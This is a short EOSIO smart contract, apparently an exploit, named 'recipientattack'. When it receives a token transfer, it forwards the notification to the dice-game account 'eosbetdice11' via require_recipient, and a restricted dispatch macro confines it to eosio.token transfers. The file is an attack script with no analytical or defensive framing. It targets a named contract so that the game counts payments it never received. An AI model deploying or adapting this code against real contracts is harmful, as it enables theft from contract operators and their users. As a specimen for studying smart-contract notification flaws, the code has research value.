#include <eosiolib/currency.hpp>

using namespace eosio;

class recipientattack : public contract
{
public:
  recipientattack(account_name self)
      : contract(self)
  {
  }
  void transfer(account_name from, account_name to, asset quantity, string memo)
  {
    if (from == _self || to != _self)
    {
      return;
    }
    
    require_recipient(N(eosbetdice11));
  }
};

#undef EOSIO_ABI
#define EOSIO_ABI(TYPE, MEMBERS)                                \
  extern "C" {                                                  \
  void apply(uint64_t receiver, uint64_t code, uint64_t action) \
  {                                                             \
    auto self = receiver;                                       \
    if (action == N(onerror))                                   \
    {                                                           \
      eosio_assert(code == N(eosio), "only system account");    \
    }                                                           \
    if ((code == N(eosio.token) && action == N(transfer)))      \
    {                                                           \
      TYPE thiscontract(self);                                  \
      switch (action)                                           \
      {                                                         \
        EOSIO_API(TYPE, MEMBERS)                                \
      }                                                         \
    }                                                           \
  }                                                             \
  }

EOSIO_ABI(recipientattack, (transfer))